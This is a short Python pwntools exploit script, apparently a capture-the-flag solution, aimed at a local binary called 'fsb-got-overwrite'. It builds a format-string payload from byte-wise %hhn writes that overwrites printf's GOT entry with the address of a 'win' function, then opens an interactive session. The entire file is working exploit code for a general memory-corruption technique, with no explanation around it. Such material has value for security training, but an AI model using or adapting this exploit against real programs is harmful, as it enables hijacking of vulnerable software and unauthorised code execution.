#!/usr/bin/env python3
# Author: @TheFlash2k

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

diff_hhn = lambda i, j: (( i - j) % 256)
func_byte_array_hhn = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]

exe = "./fsb-got-overwrite"
elf = context.binary = ELF(exe)
libc = elf.libc
io = process()
if args.GDB: gdb.attach(io, "b *main+115") # gdb attachment

start = 11

info("win @ %#x" % elf.sym.win)
info("got.printf @ %#x" % elf.sym.got.printf)

data = func_byte_array_hhn(elf.sym.win)

payload = f"%{data[0]}c%{start}$lln"
for i in range(1, len(data)):
    payload += f"%{diff_hhn(data[i], data[i-1])}c%{start+i}$hhn"

# padding:
payload = payload.encode() + b"||||||"

# writing the address:
for i in range(len(data)):
    payload += p64(elf.sym.got.printf+i)

io.sendline(payload)

io.interactive()
